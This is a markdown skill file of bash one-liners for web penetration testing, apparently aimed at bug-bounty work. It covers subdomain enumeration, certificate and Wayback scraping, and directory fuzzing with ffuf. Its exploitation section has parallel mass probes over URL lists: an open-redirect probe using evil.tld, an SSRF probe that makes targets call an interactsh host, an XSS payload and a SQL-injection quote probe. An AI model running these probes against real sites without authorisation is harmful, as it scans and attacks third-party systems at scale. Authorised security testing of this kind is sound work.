# SKILL: One-Liners Collection
## Version: 1.0 | Domain: scripting

---

## RECON
```bash
# All-in-one passive sub enum
echo $T | (subfinder -all -silent; assetfinder; chaos -silent) | sort -u

# Cert SAN extraction
curl -sk https://$T --connect-timeout 5 | openssl s_client -servername $T -connect $T:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep -oE 'DNS:[^ ,]+' | tr -d 'DNS:'

# Wayback URL fetch + dedup
curl -sk "http://web.archive.org/cdx/search/cdx?url=*.$T/*&output=text&fl=original&collapse=urlkey" | sort -u

# JS endpoint dump
curl -sk $URL | grep -oE 'https?://[^"\\\\\'']+|/[a-zA-Z0-9_/.-]+' | sort -u

# Subdomain takeover quick check
for s in $(cat subs.txt); do
  curl -sk -o /dev/null -w "%{http_code} $s\\n" $s --connect-timeout 5 | grep -E '404 .*\.(s3\.amazonaws|github\.io|herokuapp|azurewebsites)'
done
```

## EXPLOITATION
```bash
# Mass open redirect probe
cat urls.txt | qsreplace 'https://evil.tld' | xargs -I{} -P50 sh -c 'curl -sIk {} | grep -i "Location: https://evil.tld" && echo "REDIR: {}"'

# Mass SSRF probe (with interactsh)
SUBDOMAIN=$(interactsh-client -n 1 -ps | head -1)
cat urls.txt | qsreplace "http://$SUBDOMAIN" | xargs -I{} -P50 curl -sk -o /dev/null {}
# (then watch interactsh logs for hits)

# Mass XSS probe
cat urls.txt | qsreplace '"><svg onload=alert(1)>' | xargs -I{} -P50 sh -c 'curl -sk {} | grep -E "svg onload=alert" && echo "XSS-REF: {}"'

# Mass SQLi quote-error probe
cat urls.txt | qsreplace "'" | xargs -I{} -P50 sh -c 'curl -sk {} | grep -E "syntax|MySQL|mysqli|PostgreSQL|ORA-|sqlite" && echo "SQLI?: {}"'
```

## CONTENT DISCOVERY
```bash
# Top 50 fastest content discovery (recursive)
ffuf -u https://$T/FUZZ -w ~/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -mc all -fc 404 -ac -e .php,.html,.json,.bak,.zip,.tar.gz,.git -recursion -recursion-depth 2 -t 50

# Burp known-good fuzz wordlist
ffuf -u "https://$T/?FUZZ=test" -w ~/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -ac
```

## EXTRACT/DEDUP
```bash
# Add only new
cat new.txt | anew known.txt
# Sort + uniq + length
sort | uniq -c | sort -rn | head -20
# Get domains only
unfurl -u domains
# Get params only
unfurl -u keys
```

## REFERENCES
Tomnomnom collection, hak5/swiss
